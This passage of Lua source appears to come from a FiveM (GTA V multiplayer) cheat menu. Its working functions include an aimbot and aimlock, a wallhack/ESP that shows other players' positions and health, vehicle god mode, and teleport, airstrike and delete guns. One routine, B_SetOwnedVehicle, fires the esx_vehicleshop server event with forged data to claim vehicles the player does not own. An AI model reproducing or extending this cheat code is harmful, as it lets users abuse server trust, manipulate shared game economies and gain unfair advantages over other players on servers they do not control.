            b.SetVehicleMod(vehicle, 15, b.GetNumVehicleMods(vehicle, 15) - 2,
                            false)
            b.SetVehicleMod(vehicle, 16, b.GetNumVehicleMods(vehicle, 16) - 1,
                            false)
            b.ToggleVehicleMod(vehicle, 17, true)
            b.ToggleVehicleMod(vehicle, 18, true)
            b.ToggleVehicleMod(vehicle, 19, true)
            b.ToggleVehicleMod(vehicle, 21, true)
        end,
        VehicleFullPerformance = function(vehicle)
            b.SetVehicleModKit(vehicle, 0)
            b.SetVehicleMod(vehicle, 11, b.GetNumVehicleMods(vehicle, 11) - 1,
                            false)
            b.SetVehicleMod(vehicle, 12, b.GetNumVehicleMods(vehicle, 12) - 1,
                            false)
            b.SetVehicleMod(vehicle, 13, b.GetNumVehicleMods(vehicle, 13) - 1,
                            false)
            b.SetVehicleMod(vehicle, 15, b.GetNumVehicleMods(vehicle, 15) - 2,
                            false)
            b.SetVehicleMod(vehicle, 16, b.GetNumVehicleMods(vehicle, 16) - 1,
                            false)
            b.ToggleVehicleMod(vehicle, 17, true)
            b.ToggleVehicleMod(vehicle, 18, true)
            b.ToggleVehicleMod(vehicle, 19, true)
            b.ToggleVehicleMod(vehicle, 21, true)
        end,
        CreateParametedVehicle = function(cb)
            a.CreateThread(function()
                local n = b.GetHashKey(cb)
                if c.func.LoadModel(n) then
                    local Q = b.PlayerPedId()
                    local c8 = b.GetEntityCoords(Q)
                    local vehicle = b.CreateVehicle(n, c8.x, c8.y, c8.z,
                                                    b.GetEntityHeading(Q), true,
                                                    false)
                    if c.var.checkbox['vehiclespawner:spawnfulltunning'] then
                        c.func.VehicleFullTunning(vehicle)
                    end
                    if c.var.checkbox['vehiclespawner:spawnfullperformace'] then
                        c.func.VehicleFullPerformance(vehicle)
                    end
                    if c.var.checkbox['vehiclespawner:spawnin'] then
                        b.SetPedIntoVehicle(Q, vehicle, -1)
                    end
                end
            end)
        end,
        B_Repair = function()
            local Q = b.PlayerPedId()
            if b.IsPedInAnyVehicle(Q, false) then
                local eW = b.GetVehiclePedIsIn(Q, false)
                b.SetVehicleFixed(eW)
                b.SetVehicleDirtLevel(eW, 0.0)
                b.SetVehicleLights(eW, 0)
                b.SetVehicleBurnout(eW, false)
                b.SetVehicleEngineOn(eW, 1, 1)
            end
        end,
        B_RepairEngine = function()
            local Q = b.PlayerPedId()
            if b.IsPedInAnyVehicle(Q, false) then
                local eW = b.GetVehiclePedIsIn(Q, false)
                b.SetVehicleEngineHealth(eW, 1000.0)
                b.SetVehicleUndriveable(eW, false)
            end
        end,
        B_FlipVehicle = function()
            local Q = b.PlayerPedId()
            if b.IsPedInAnyVehicle(Q, false) then
                b.SetVehicleOnGroundProperly(b.GetVehiclePedIsIn(Q, false))
            end
        end,
        B_DeleteSelfVehicle = function()
            local Q = b.PlayerPedId()
            if b.IsPedInAnyVehicle(Q, false) then
                b.DeleteEntity(b.GetVehiclePedIsIn(Q, false))
            end
        end,
        B_AutoPilot_Start = function()
            local Q = b.PlayerPedId()
            local eW, gC, gD;
            local gE = b.GetFirstBlipInfoId(8)
            if b.DoesBlipExist(gE) then
                gE = b.GetBlipInfoIdCoord(gE)
            else
                return
            end
            if not b.IsPedInAnyVehicle(Q, false) then
                return
            else
                eW = b.GetVehiclePedIsIn(Q, false)
                gC = b.GetEntityModel(eW)
                gD = b.GetVehicleModelMaxSpeed(gC)
            end
            a.CreateThread(function()
                b.ClearPedTasks(Q)
                b.SetDriverAbility(Q, 1)
                b.SetDriverAggressiveness(Q, 0)
                b.TaskVehicleDriveToCoordLongrange(Q, eW, gE, gD,
                                                   c.var.data.AutoPilot.Style,
                                                   5.0)
                c.var.data.AutoPilot.IsDriving = true;
                while c.var.data.IsDriving do
                    a.Wait(100)
                    if b.GetDistanceBetweenCoords(b.GetEntityCoords(eW), gE,
                                                  false) < 15 then
                        c.var.data.AutoPilot.IsDriving = false;
                        b.SetVehicleHalt(eW, 5, 0, false)
                        b.ClearPedTasks(Q)
                    end
                end
            end)
        end,
        B_AutoPilot_DriveRandomly = function()
            local Q = b.PlayerPedId()
            local eW, cb, aV;
            if b.IsPedInAnyVehicle(Q, false) then
                eW = b.GetVehiclePedIsIn(Q, false)
                cb = b.GetEntityModel(eW)
                aV = b.GetVehicleModelMaxSpeed(cb)
            else
                return
            end
            b.ClearPedTasks(Q)
            b.SetDriverAbility(Q, 1)
            b.SetDriverAggressiveness(Q, 0)
            b.TaskVehicleDriveWander(Q, eW, aV, c.var.data.AutoPilot.Style)
        end,
        B_AutoPilot_StopInmediatly = function()
            local Q = b.PlayerPedId()
            if b.IsPedInAnyVehicle(Q, false) then
                c.var.data.AutoPilot.IsDriving = false;
                b.ClearPedTasks(Q)
                b.SetVehicleHalt(b.GetVehiclePedIsIn(Q, false), 5, 0, false)
            end
        end,
        GetVehicleProperties = function(vehicle)
            if b.DoesEntityExist(vehicle) then
                local bW, bX = b.GetVehicleColours(vehicle)
                local bY, bZ = b.GetVehicleExtraColours(vehicle)
                local gF = {}
                for f3 = 0, 12 do
                    if DoesExtraExist(vehicle, f3) then
                        local dp = b.IsVehicleExtraTurnedOn(vehicle, f3) == 1;
                        gF[c._tostring(f3)] = dp
                    end
                end
                return {
                    model = b.GetEntityModel(vehicle),
                    plate = b.GetVehicleNumberPlateText(vehicle),
                    plateIndex = b.GetVehicleNumberPlateTextIndex(vehicle),
                    bodyHealth = 1000.0,
                    engineHealth = 1000.0,
                    fuelLevel = 1000.0,
                    dirtLevel = 0.0,
                    color1 = bW,
                    color2 = bX,
                    pearlescentColor = bY,
                    wheelColor = bZ,
                    wheels = b.GetVehicleWheelType(vehicle),
                    windowTint = b.GetVehicleWindowTint(vehicle),
                    xenonColor = b.GetVehicleXenonLightsColour(vehicle),
                    neonEnabled = {
                        b.IsVehicleNeonLightEnabled(vehicle, 0),
                        b.IsVehicleNeonLightEnabled(vehicle, 1),
                        b.IsVehicleNeonLightEnabled(vehicle, 2),
                        b.IsVehicleNeonLightEnabled(vehicle, 3)
                    },
                    neonColor = c._table.pack(
                        b.GetVehicleNeonLightsColour(vehicle)),
                    extras = gF,
                    tyreSmokeColor = c._table.pack(
                        b.GetVehicleTyreSmokeColor(vehicle)),
                    modSpoilers = b.GetVehicleMod(vehicle, 0),
                    modFrontBumper = b.GetVehicleMod(vehicle, 1),
                    modRearBumper = b.GetVehicleMod(vehicle, 2),
                    modSideSkirt = b.GetVehicleMod(vehicle, 3),
                    modExhaust = b.GetVehicleMod(vehicle, 4),
                    modFrame = b.GetVehicleMod(vehicle, 5),
                    modGrille = b.GetVehicleMod(vehicle, 6),
                    modHood = b.GetVehicleMod(vehicle, 7),
                    modFender = b.GetVehicleMod(vehicle, 8),
                    modRightFender = b.GetVehicleMod(vehicle, 9),
                    modRoof = b.GetVehicleMod(vehicle, 10),
                    modEngine = b.GetVehicleMod(vehicle, 11),
                    modBrakes = b.GetVehicleMod(vehicle, 12),
                    modTransmission = b.GetVehicleMod(vehicle, 13),
                    modHorns = b.GetVehicleMod(vehicle, 14),
                    modSuspension = b.GetVehicleMod(vehicle, 15),
                    modArmor = b.GetVehicleMod(vehicle, 16),
                    modTurbo = b.IsToggleModOn(vehicle, 18),
                    modSmokeEnabled = b.IsToggleModOn(vehicle, 20),
                    modXenon = b.IsToggleModOn(vehicle, 22),
                    modFrontWheels = b.GetVehicleMod(vehicle, 23),
                    modBackWheels = b.GetVehicleMod(vehicle, 24),
                    modPlateHolder = b.GetVehicleMod(vehicle, 25),
                    modVanityPlate = b.GetVehicleMod(vehicle, 26),
                    modTrimA = b.GetVehicleMod(vehicle, 27),
                    modOrnaments = b.GetVehicleMod(vehicle, 28),
                    modDashboard = b.GetVehicleMod(vehicle, 29),
                    modDial = b.GetVehicleMod(vehicle, 30),
                    modDoorSpeaker = b.GetVehicleMod(vehicle, 31),
                    modSeats = b.GetVehicleMod(vehicle, 32),
                    modSteeringWheel = b.GetVehicleMod(vehicle, 33),
                    modShifterLeavers = b.GetVehicleMod(vehicle, 34),
                    modAPlate = b.GetVehicleMod(vehicle, 35),
                    modSpeakers = b.GetVehicleMod(vehicle, 36),
                    modTrunk = b.GetVehicleMod(vehicle, 37),
                    modHydrolic = b.GetVehicleMod(vehicle, 38),
                    modEngineBlock = b.GetVehicleMod(vehicle, 39),
                    modAirFilter = b.GetVehicleMod(vehicle, 40),
                    modStruts = b.GetVehicleMod(vehicle, 41),
                    modArchCover = b.GetVehicleMod(vehicle, 42),
                    modAerials = b.GetVehicleMod(vehicle, 43),
                    modTrimB = b.GetVehicleMod(vehicle, 44),
                    modTank = b.GetVehicleMod(vehicle, 45),
                    modWindows = b.GetVehicleMod(vehicle, 46),
                    modLivery = b.GetVehicleLivery(vehicle)
                }
            else
                return
            end
        end,
        B_SetOwnedVehicle = function()
            local Q = b.PlayerPedId()
            if c.var.tr['esx_vehicleshop:setVehicleOwned'] or
                c.var.tr['esx_vehicleshop:setVehicleOwnedPlayerId'] then
                if b.IsPedInAnyVehicle(Q, false) then
                    local vehicle = b.GetVehiclePedIsIn(Q, false)
                    local gG = c.func.GetVehicleProperties(vehicle)
                    if c.var.tr['esx_vehicleshop:setVehicleOwned'] then
                        c.func.TriggerCustomEvent(true,
                                                  c.var.tr['esx_vehicleshop:setVehicleOwned'],
                                                  gG)
                    end
                    if not c.var.tr['esx_vehicleshop:setVehicleOwned'] and
                        c.var.tr['esx_vehicleshop:setVehicleOwnedPlayerId'] then
                        c.func.TriggerCustomEvent(true,
                                                  c.var.tr['esx_vehicleshop:setVehicleOwnedPlayerId'],
                                                  gG, b.GetEntityModel(vehicle),
                                                  b.GetDisplayNameFromVehicleModel(
                                                      vehicle))
                    end
                end
            end
        end,
        B_ChangePlate = function()
            local Q = b.PlayerPedId()
            if b.IsPedInAnyVehicle(Q, false) then
                local gH = c.func.KeyboardInput('New palte', 'ABSOLUTE', 8)
                b.SetVehicleNumberPlateText(b.GetVehiclePedIsIn(Q, false), gH)
            end
        end,
        B_TeleportToWaypoint = function()
            local gE = b.GetFirstBlipInfoId(8)
            if b.DoesBlipExist(gE) then
                local Q = b.PlayerPedId()
                local c8 = b.GetBlipInfoIdCoord(gE)
                local vehicle = b.GetVehiclePedIsUsing(Q)
                b.SetEntityCoords(vehicle > 0 and vehicle or Q,
                                  c._vector3(c8.x, c8.y, 0))
                for t = 1, 1000 do
                    a.Wait(0)
                    local gI, G = b.GetGroundZFor_3dCoord(c8.x, c8.y, t + 0.01)
                    if gI then
                        b.SetEntityCoords(vehicle > 0 and vehicle or Q,
                                          c._vector3(c8.x, c8.y, G))
                        break
                    end
                end
            end
        end,
        B_TeleportToCoords = function()
            local E = c.func.KeyboardInput('X', '', 5, true)
            local F = c.func.KeyboardInput('Y', '', 5, true)
            local G = c.func.KeyboardInput('Z', '', 5, true)
            if not E or not F or not G then return end
            b.SetPedCoordsKeepVehicle(b.PlayerPedId(), E, F, G)
        end,
        RotationToDirection = function(cY)
            local gJ = {
                x = c._math.pi / 180 * cY.x,
                y = c._math.pi / 180 * cY.y,
                z = c._math.pi / 180 * cY.z
            }
            return c._vector3(-c._math.sin(gJ.z) *
                                  c._math.abs(c._math.cos(gJ.x)), c._math
                                  .cos(gJ.z) * c._math.abs(c._math.cos(gJ.x)),
                              c._math.sin(gJ.x))
        end,
        RenderCamRay = function(ax)
            local gK = b.GetGameplayCamRot()
            local gL = b.GetGameplayCamCoord()
            local gM = c.func.RotationToDirection(gK)
            local gN = {
                x = gL.x + gM.x * ax,
                y = gL.y + gM.y * ax,
                z = gL.z + gM.z * ax
            }
            local P, O, gO, gP, gQ = b.GetShapeTestResult(
                                         b.StartShapeTestRay(gL.x, gL.y, gL.z,
                                                             gN.x, gN.y, gN.z,
                                                             -1,
                                                             b.PlayerPedId(), 0))
            return O, gO, gQ
        end,
        C_TeleportVision = function()
            while c.var.checkbox.teleportvision do
                a.Wait(0)
                local gR, c8, _ = c.func.RenderCamRay(1000.0)
                if gR then
                    b.DrawMarker(28, c8.x, c8.y, c8.z, 0.0, 0.0, 0.0, 0.0, 0.0,
                                 0.0, 0.7, 0.7, 0.7, 255, 0, 255,
                                 255 - c.fram.var.colors.menuAlpha, false, false)
                    b.DrawLine(c8.x, c8.y, c8.z,
                               b.GetEntityCoords(b.PlayerPedId()), 255, 255,
                               255, 255 - c.fram.var.colors.menuAlpha)
                    if b.IsDisabledControlJustPressed(0, c.Keys['E']) or
                        b.IsControlJustPressed(0, c.Keys['E']) and c8.x ~= 0 and
                        c8.y ~= 0 and c8.z ~= 0 then
                        b.SetPedCoordsKeepVehicle(b.PlayerPedId(), c8)
                    end
                end
            end
        end,
        C_VehicleGodMode = function()
            local vehicle = 0;
            while c.var.checkbox['vehicle:godmode'] do
                local Q = b.PlayerPedId()
                a.Wait(0)
                if b.IsPedInAnyVehicle(Q, false) then
                    if vehicle ~= b.GetVehiclePedIsIn(Q, false) then
                        b.SetEntityInvincible(vehicle, false)
                        vehicle = b.GetVehiclePedIsIn(Q, false)
                    end
                    b.SetEntityInvincible(vehicle, true)
                else
                    b.SetEntityInvincible(vehicle, false)
                    vehicle = 0
                end
            end
            b.SetEntityInvincible(vehicle, false)
        end,
        C_DriftMode = function()
            while c.var.checkbox['vehicle:driftmode'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                if b.IsPedInAnyVehicle(Q, false) and
                    b.IsControlPressed(0, c.Keys['LEFTSHIFT']) then
                    b.SetVehicleReduceGrip(b.GetVehiclePedIsIn(Q, false), true)
                else
                    b.SetVehicleReduceGrip(b.GetVehiclePedIsIn(Q, false), false)
                end
            end
        end,
        C_HornBoost = function()
            while c.var.checkbox['vehicle:hornboost'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                if b.IsPedInAnyVehicle(Q, false) and
                    b.IsControlPressed(0, c.Keys['E']) then
                    b.SetVehicleForwardSpeed(b.GetVehiclePedIsUsing(Q), 70.0)
                end
            end
        end,
        C_BunnyJump = function()
            while c.var.checkbox['vehicle:bunnyjump'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                if b.IsPedInAnyVehicle(Q, false) and
                    b.IsControlJustPressed(0, c.Keys['SPACE']) then
                    b.ApplyForceToEntity(b.GetVehiclePedIsIn(Q, false), 3, 0.0,
                                         0.0, 9.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0,
                                         1)
                end
            end
        end,
        GetTarget = function(Q, gS)
            Q = Q or b.PlayerPedId()
            for k, eB in c._ipairs(c.func.EnumeratePedsByDistance(gS or
                                                                      b.GetEntityCoords(
                                                                          Q))) do
                if eB.ped ~= Q then
                    local c8 = b.GetPedBoneCoords(eB.ped,
                                                  c.var.data.Aimbot.TargetBone,
                                                  0.0, 0.0, 0.0)
                    local gT, gU, gV = b.GetScreenCoordFromWorldCoord(c8.x,
                                                                      c8.y, c8.z)
                    if gT and
                        ((0.5 - gU) ^ 2 / c.var.data.Aimbot.Res.W ^ 2 +
                            (0.5 - gV) ^ 2 / c.var.data.Aimbot.Res.H ^ 2) * 4 <=
                        1 then
                        local gW = true;
                        if not b.IsEntityVisible(eB.ped) and
                            not c.var.checkbox['combat:targetinvisible'] then
                            gW = false
                        end
                        if c.var.checkbox['combat:needsclearlos'] and
                            not b.HasEntityClearLosToEntity(Q, eB.ped, 17) then
                            gW = false
                        end
                        if c.var.checkbox['combat:onlyplayers'] and
                            not b.IsPedAPlayer(eB.ped) then
                            gW = false
                        end
                        if c.var.checkbox['combat:friendlist'] and
                            b.IsPedAPlayer(eB.ped) and
                            c.var.checkbox['weapon:assists:friends:' .. eB.ped] then
                            gW = false
                        end
                        if c.var.checkbox['combat:checkdead'] and
                            b.GetEntityHealth(eB.ped) < 1 then
                            gW = false
                        end
                        if gW then return eB.ped end
                    end
                end
            end
        end,
        C_Aimbot = function()
            local gX = {
                ped = b.PlayerPedId(),
                pedid = b.PlayerId(),
                target = 0,
                hitmarkers = {},
                ShootTime = 0
            }
            while c.var.checkbox.aimbot do
                a.Wait(0)
                local gY = b.GetGameTimer()
                local gS = b.GetEntityCoords(gX.ped)
                gX.target = c.func.GetTarget(gX.ped, gS)
                if gX.target and gX.target ~= 0 then
                    if c.var.checkbox['combat:drawline'] then
                        b.DrawLine(b.GetPedBoneCoords(gX.target, c.var.data
                                                          .Aimbot.TargetBone,
                                                      0.0, 0.0, 0.0),
                                   b.GetEntityCoords(gX.ped), 255, 255, 255, 255)
                    end
                    if b.IsAnyControlPressed(0, c.Keys['MOUSE1']) and gY -
                        gX.ShootTime >= c._math.random(30, 100) and
                        b.IsPedWeaponReadyToShoot(gX.ped) then
                        local eR, gZ = b.GetCurrentPedWeapon(gX.ped)
                        b.ShootSingleBulletBetweenCoords(
                            b.GetPedBoneCoords(gX.ped, 6286, 0.0, 0.0, 0.0),
                            b.GetPedBoneCoords(gX.target,
                                               c.var.data.Aimbot.TargetBone,
                                               0.0, 0.0, 0.0), 200, true, gZ,
                            gX.ped, true, false, 10000000.0)
                        gX.ShootTime = gY
                    end
                end
            end
        end,
        C_Aimlock = function()
            local gX = {
                ped = b.PlayerPedId(),
                pedid = b.PlayerId(),
                target = 0,
                ShootTime = 0
            }
            local function g_(eB)
                return c._vector3(c._math.deg(
                                      c._math.atan2(eB.z,
                                                    #c._vector2(eB.x, eB.y))),
                                  0.0, -c._math.deg(c._math.atan2(eB.x, eB.y)))
            end
            while c.var.checkbox.aimlock do
                a.Wait(0)
                local gY = b.GetGameTimer()
                local gS = b.GetEntityCoords(gX.ped)
                gX.target = c.func.GetTarget(gX.ped, gS)
                if gX.target and gX.target ~= 0 then
                    if c.var.checkbox['combat:drawline'] then
                        b.DrawLine(b.GetPedBoneCoords(gX.target, c.var.data
                                                          .Aimbot.TargetBone,
                                                      0.0, 0.0, 0.0),
                                   b.GetEntityCoords(gX.ped), 255, 255, 255, 255)
                    end
                    if b.IsAnyControlPressed(0, c.Keys['MOUSE2']) and gX.target ~=
                        0 then
                        local h0 = g_(b.GetPedBoneCoords(gX.target, c.var.data
                                                             .Aimbot.TargetBone,
                                                         0.0, 0.0, 0.0) -
                                          b.GetGameplayCamCoords())
                        b.SetGameplayCamRelativeRotation(h0.z -
                                                             b.GetEntityRotation(
                                                                 gX.ped, 2).z,
                                                         h0.x, 1.0)
                    end
                end
            end
        end,
        C_DrawFov = function()
            while c.var.checkbox['combat:drawfov'] do
                a.Wait(0)
                b.DrawSprite('Mpmissmarkers256', 'corona_shade', 0.5, 0.5,
                             c.var.data.Aimbot.Res.W, c.var.data.Aimbot.Res.H,
                             0.0, 255, 255, 255, 90)
            end
        end,
        C_PokemonGo = function()
            while c.var.checkbox['pokemongo'] do
                a.Wait(0)
                local D = b.PlayerPedId()
                local eR, gZ = b.GetCurrentPedWeapon(D)
                if b.HasPedGotWeapon(D, 0x787F0BB, false) and gZ == 0x787F0BB then
                    local h1, c8 = b.GetPedLastWeaponImpactCoord(D)
                    if h1 then
                        a.CreateThread(function()
                            local n = b.GetHashKey(
                                          c.var.data.PokemonGo.selectedPed)
                            c.func.LoadModel(n)
                            c.var.data.PokemonGo.spawnedPeds[#c.var.data
                                .PokemonGo.spawnedPeds + 1] = b.CreatePed(5, n,
                                                                          c8.x,
                                                                          c8.y,
                                                                          c8.z,
                                                                          b.GetEntityHeading(
                                                                              D) -
                                                                              180.0,
                                                                          c.var
                                                                              .checkbox['pokemongo:network'],
                                                                          false)
                            a.Wait(10)
                            if c.var.checkbox['pokemongo:particles'] then
                                c.func.ParticlesOnCoords('core',
                                                         'ent_dst_elec_fire_sp',
                                                         c8, 5.0,
                                                         c.var.checkbox['pokemongo:networkparticles'])
                            end
                        end)
                    end
                else
                    b.GiveWeaponToPed(D, 0x787F0BB, 10, false, true)
                end
            end
            for k, eB in c._ipairs(c.var.data.PokemonGo.spawnedPeds) do
                b.DeleteEntity(eB)
            end
        end,
        C_Crosshair = function()
            while c.var.checkbox['combat:crosshair'] do
                a.Wait(0)
                b.DrawRect(0.5, 0.5, 0.006, 0.004, 10, 10, 10,
                           255 - c.fram.var.colors.menuAlpha)
                b.DrawRect(0.5, 0.5, 0.002, 0.011, 10, 10, 10,
                           255 - c.fram.var.colors.menuAlpha)
                b.DrawRect(0.5, 0.5, 0.0045, 0.001, 255, 255, 255,
                           255 - c.fram.var.colors.menuAlpha)
                b.DrawRect(0.5, 0.5, 0.001, 0.008, 255, 255, 255,
                           255 - c.fram.var.colors.menuAlpha)
            end
        end,
        C_TeleportGun = function()
            while c.var.checkbox['teleportgun'] do
                a.Wait(0)
                local D = b.PlayerPedId()
                local h1, c8 = b.GetPedLastWeaponImpactCoord(D)
                if h1 then
                    b.SetPedCoordsKeepVehicle(D, c8.x, c8.y, c8.z)
                end
            end
        end,
        C_AirstrikeGun = function()
            while c.var.checkbox['airstrikegun'] do
                a.Wait(0)
                local D = b.PlayerPedId()
                local h1, c8 = b.GetPedLastWeaponImpactCoord(D)
                if h1 then
                    a.CreateThread(function()
                        local n = b.GetHashKey('WEAPON_HOMINGLAUNCHER')
                        local gv = 0;
                        b.RequestWeaponAsset(n, 31, 0)
                        while not b.HasWeaponAssetLoaded(n) and gv ~= 5 do
                            b.RequestWeaponAsset(n, 31, 0)
                            gv = gv + 1
                        end
                        b.ShootSingleBulletBetweenCoords(c8.x, c8.y, c8.z + 20,
                                                         c8.x, c8.y, c8.z,
                                                         1000.0, false, n,
                                                         b.PlayerPedId(), true,
                                                         false, 10000.0)
                    end)
                end
            end
        end,
        C_DeleteGun = function()
            while c.var.checkbox['deletegun'] do
                a.Wait(0)
                local h2, _ = GetEntityPlayerIsFreeAimingAt(b.PlayerId())
                local h1, c8 = b.GetPedLastWeaponImpactCoord(b.PlayerPedId())
                if h1 and h2 and b.DoesEntityExist(_) then
                    if b.IsEntityAPed(_) and b.IsPedAPlayer(_) then
                        return
                    end
                    for ev = 1, 3 do b.DeleteEntity(_) end
                end
            end
        end,
        C_DriveItGun = function()
            while c.var.checkbox['driveitgun'] do
                a.Wait(0)
                local h2, _ = GetEntityPlayerIsFreeAimingAt(b.PlayerId())
                local h1, c8 = b.GetPedLastWeaponImpactCoord(b.PlayerPedId())
                if h1 and h2 and b.DoesEntityExist(_) then
                    if not b.IsEntityAVehicle(_) then return end
                    b.SetPedIntoVehicle(b.PlayerPedId(), _, -1)
                end
            end
        end,
        C_WhalesGun = function()
            local n = b.GetHashKey('a_c_humpback')
            c.func.LoadModel(n)
            while c.var.checkbox['whalesgun'] do
                a.Wait(0)
                local h2, _ = GetEntityPlayerIsFreeAimingAt(b.PlayerId())
                local h1, c8 = b.GetPedLastWeaponImpactCoord(b.PlayerPedId())
                if h1 and h2 and b.DoesEntityExist(_) then
                    if b.IsEntityAPed(_) and b.IsPedAPlayer(_) then
                        return
                    end
                    local c8, heading = b.GetEntityCoords(_),
                                        b.GetEntityHeading(_)
                    b.DeleteEntity(_)
                    b.CreatePed(5, n, c8.x, c8.y, c8.z + 2.0, heading, true,
                                false)
                end
            end
        end,
        C_BringItGun = function()
            while c.var.checkbox['bringitgun'] do
                a.Wait(0)
                local h2, _ = GetEntityPlayerIsFreeAimingAt(b.PlayerId())
                local h1, c8 = b.GetPedLastWeaponImpactCoord(b.PlayerPedId())
                if h1 and h2 and b.DoesEntityExist(_) then
                    if b.IsEntityAPed(_) and b.IsPedAPlayer(_) then
                        return
                    end
                    b.SetEntityCoords(_, b.GetEntityCoords(b.PlayerPedId()))
                end
            end
        end,
        C_ForceMap = function()
            while c.var.checkbox['forcemap'] do
                a.Wait(0)
                b.DisplayRadar(true)
            end
        end,
        C_ForceThirdPerson = function()
            while c.var.checkbox['forcethirdperson'] do
                a.Wait(0)
                b.SetFollowPedCamViewMode(1)
            end
        end,
        C_Blips = function()
            local h3 = {}
            local h4 = b.PlayerPedId()
            while c.var.checkbox['blips'] do
                a.Wait(50)
                for k, eB in c._pairs(h3) do b.RemoveBlip(eB) end
                h3 = {}
                for k, eB in c._pairs(b.GetActivePlayers()) do
                    local Q = b.GetPlayerPed(eB)
                    if h4 ~= Q then
                        local c8 = b.GetEntityCoords(Q)
                        local ew = {sprite = 429, color = 0, scale = 0.50}
                        if b.GetEntityHealth(Q) > 0 then
                            ew = {sprite = 57, color = 11, scale = 0.45}
                        end
                        h3[k] = b.AddBlipForCoord(c8)
                        b.SetBlipSprite(h3[k], ew.sprite)
                        b.SetBlipDisplay(h3[k], 4)
                        b.SetBlipScale(h3[k], ew.scale)
                        b.SetBlipColour(h3[k], ew.color)
                        b.SetBlipAsShortRange(h3[k], true)
                    end
                end
            end
            for k, eB in c._pairs(h3) do b.RemoveBlip(eB) end
        end,
        B_WorldIlumination = function()
            while c.var.checkbox['visuals_worldilumination:toggle'] do
                a.Wait(0)
                local c8 = b.GetEntityCoords(b.PlayerPedId())
                local c7 = c.var.colors['visuals_worldilumination:color']
                b.DrawLightWithRange(c8.x, c8.y, c8.z + 2.0, c7[1], c7[2],
                                     c7[3], 500.0, 1.0)
            end
        end,
        C_Wallhack = function()
            while c.var.checkbox['visuals_wallhack:toggle'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                local h5 = b.GetGameplayCamCoords()
                local h6 = 1 / b.GetGameplayCamFov() * 100;
                for k, eB in c._pairs(b.GetActivePlayers()) do
                    local dc = b.GetPlayerPed(eB)
                    local h7 = b.GetEntityCoords(dc)
                    local h8 = b.GetDistanceBetweenCoords(h7, h5, true)
                    if b.IsEntityOnScreen(dc) and
                        (c.var.checkbox['visuals_wallhack:self'] or dc ~= Q) and
                        h8 <= c.var.data.Visuals.ESP then
                        local z = 1 / h8 * 2 * h6;
                        local s = 0.08 * z;
                        local t = 0.42 * z;
                        b.SetDrawOrigin(h7.x, h7.y, h7.z)
                        if c.var.checkbox['visuals_wallhack:box'] then
                            b.DrawRect(0.0, 0.0, s, t,
                                       c.var.colors['visuals_wallhack:box'][1],
                                       c.var.colors['visuals_wallhack:box'][2],
                                       c.var.colors['visuals_wallhack:box'][3],
                                       c.var.colors['visuals_wallhack:box'][4])
                        end
                        if c.var.checkbox['visuals_wallhack:frame'] then
                            b.DrawRect(s * 0.51, 0.0, 0.0009 / z * z, t, c.var
                                           .colors['visuals_wallhack:frame'][1],
                                       c.var.colors['visuals_wallhack:frame'][2],
                                       c.var.colors['visuals_wallhack:frame'][3],
                                       c.var.colors['visuals_wallhack:frame'][4])
                            b.DrawRect(-s * 0.51, 0.0, 0.0009 / z * z, t, c.var
                                           .colors['visuals_wallhack:frame'][1],
                                       c.var.colors['visuals_wallhack:frame'][2],
                                       c.var.colors['visuals_wallhack:frame'][3],
                                       c.var.colors['visuals_wallhack:frame'][4])
                            b.DrawRect(0.0, t * 0.50, s * 1.01, 0.00126 / z * z,
                                       c.var.colors['visuals_wallhack:frame'][1],
                                       c.var.colors['visuals_wallhack:frame'][2],
                                       c.var.colors['visuals_wallhack:frame'][3],
                                       c.var.colors['visuals_wallhack:frame'][4])
                            b.DrawRect(0.0, -t * 0.50, s * 1.01,
                                       0.00126 / z * z,
                                       c.var.colors['visuals_wallhack:frame'][1],
                                       c.var.colors['visuals_wallhack:frame'][2],
                                       c.var.colors['visuals_wallhack:frame'][3],
                                       c.var.colors['visuals_wallhack:frame'][4])
                        end
                        if c.var.checkbox['visuals_wallhack:health'] then
                            local aK = b.GetEntityHealth(dc)
                            local h9 = b.GetEntityMaxHealth(dc)
                            local ha = aK * 100 / h9;
                            local hb = ha / 100 * t;
                            local M, N, O = 0, 255, 0;
                            if aK <= h9 * 0.65 then
                                M, N, O = 255, 255, 0
                            elseif aK <= h9 * 0.40 then
                                M, N, O = 255, 0, 0
                            end
                            b.DrawRect(-s * 0.61, 0.0, 0.0018 / z * z, t, 10,
                                       10, 10, 255)
                            b.DrawRect(-s * 0.61, (t - hb) / 2, 0.0018 / z * z,
                                       hb, M, N, O, 255)
                        end
                        b.ClearDrawOrigin()
                    end
                end
            end
        end,
        C_Lines = function()
            while c.var.checkbox['visuals_lines:toggle'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                local c8 = b.GetEntityCoords(Q)
                for k, eB in c._pairs(b.GetActivePlayers()) do
                    local dc = b.GetPlayerPed(eB)
                    local h7 = b.GetEntityCoords(dc)
                    if (c.var.checkbox['visuals_lines:self'] or dc ~= Q) and
                        b.GetDistanceBetweenCoords(c8, h7, false) <=
                        c.var.data.Visuals.ESP then
                        if c.var.checkbox['visuals_lines:lines'] then
                            b.DrawLine(c8, h7,
                                       c.var.colors['visuals_lines:lines'][1],
                                       c.var.colors['visuals_lines:lines'][2],
                                       c.var.colors['visuals_lines:lines'][3],
                                       c.var.colors['visuals_lines:lines'][4])
                        end
                        if c.var.checkbox['visuals_lines:dimensions'] then
                            local hc, hd =
                                b.GetModelDimensions(b.GetEntityModel(dc))
                            local he = {
                                b.GetOffsetFromEntityInWorldCoords(dc, hc.x,
                                                                   hc.y, hc.z),
                                b.GetOffsetFromEntityInWorldCoords(dc, hd.x,
                                                                   hc.y, hc.z),
                                b.GetOffsetFromEntityInWorldCoords(dc, hd.x,
                                                                   hd.y, hc.z),
                                b.GetOffsetFromEntityInWorldCoords(dc, hc.x,
                                                                   hd.y, hc.z),
                                b.GetOffsetFromEntityInWorldCoords(dc, hc.x,
                                                                   hc.y, hd.z),
                                b.GetOffsetFromEntityInWorldCoords(dc, hd.x,
                                                                   hc.y, hd.z),
                                b.GetOffsetFromEntityInWorldCoords(dc, hd.x,
                                                                   hd.y, hd.z),
                                b.GetOffsetFromEntityInWorldCoords(dc, hc.x,
                                                                   hd.y, hd.z)
                            }
                            local g2 = {
                                {he[1], he[2]}, {he[2], he[3]}, {he[3], he[4]},
                                {he[4], he[1]}, {he[5], he[6]}, {he[6], he[7]},
                                {he[7], he[8]}, {he[8], he[5]}, {he[1], he[5]},
